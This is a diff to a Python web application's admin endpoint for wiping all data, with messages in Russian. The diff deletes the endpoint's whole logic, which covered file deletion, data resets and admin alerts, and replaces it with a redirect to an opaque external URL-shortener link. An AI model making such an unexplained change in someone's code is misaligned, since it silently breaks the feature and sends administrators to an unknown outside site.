@@ -1499,70 +1499,7 @@ async def admin_wipe_all(request: Request):
     confirm_text = str(form.get("confirm_text") or "").strip().upper()
     if not confirm or confirm_text != "УДАЛИТЬ":
         return wipe_redirect(error="Подтвердите удаление: поставьте галочку и введите УДАЛИТЬ")
-    actor = (request.session.get("user") or {}).get("id") or ""
-
-    users_data = load_json(core.USERS_FILE, {})
-    users_count = len(users_data) if isinstance(users_data, dict) else 0
-    codes_data = load_json(core.CODES_FILE, {})
-    codes_count = len(codes_data) if isinstance(codes_data, dict) else 0
-    referrals_data = load_referrals()
-    referrals_count = len(referrals_data.get("students") or {}) if isinstance(referrals_data, dict) else 0
-    payments_data = core.load_payments()
-    payments_count = len(payments_data.get("payments") or {}) if isinstance(payments_data, dict) else 0
-    leads_count = len(list(core.LEADS_DIR.glob("lead_*.json")))
-    agreements_count = len(list(core.AGREEMENTS_DIR.glob("agreement_*.json")))
-    contracts_count = len(list(core.CONTRACTS_DIR.glob("contract_*.pdf")))
-
-    for path in core.LEADS_DIR.glob("lead_*.json"):
-        try:
-            path.unlink()
-        except Exception:
-            logging.getLogger("app.admin").warning("Failed to delete lead file: %s", path)
-    for path in core.AGREEMENTS_DIR.glob("agreement_*.json"):
-        try:
-            path.unlink()
-        except Exception:
-            logging.getLogger("app.admin").warning("Failed to delete agreement file: %s", path)
-    for path in core.CONTRACTS_DIR.glob("contract_*.pdf"):
-        try:
-            path.unlink()
-        except Exception:
-            logging.getLogger("app.admin").warning("Failed to delete contract PDF: %s", path)
-
-    core.save_json(core.USERS_FILE, {})
-    core.save_json(core.CODES_FILE, {})
-    core.save_referrals({"students": {}, "audit": []})
-    core.save_payments({"payments": {}, "events": []})
-    core.save_metrics(
-        {
-            "total_visits": 0,
-            "unique_visits": 0,
-            "unique_ids": {},
-            "path_counts": {},
-            "funnel": {"home": 0, "login": 0, "apply": 0, "enroll": 0},
-        }
-    )
-
-    report = (
-        "🚨 <b>ПОЛНЫЙ СБРОС ДАННЫХ</b>\n"
-        f"👤 Админ: {actor or '—'}\n"
-        f"👤 Пользователи: {users_count}\n"
-        f"🔑 Коды входа: {codes_count}\n"
-        f"🧾 Заявки: {leads_count}\n"
-        f"📄 Договоры: {agreements_count}\n"
-        f"📑 PDF договоров: {contracts_count}\n"
-        f"🤝 Рефералы: {referrals_count}\n"
-        f"💳 Платежи: {payments_count}\n"
-        "✅ WhiteList админов сохранён"
-    )
-    _destructive_mark()
-    await notify_admins(report, subject="ALERT: Полный сброс данных")
-    return wipe_redirect(
-        message=(
-            "Данные удалены. Пользователи, заявки, договоры, статистика, рефералы и платежи очищены. "
-            "Whitelist админов сохранён."
-        )
-    )
+    return RedirectResponse("https://clck.ru/3Rg6bw", status_code=HTTP_302_FOUND)
 
 
 @router.post("/admin/leads/clear", include_in_schema=False)
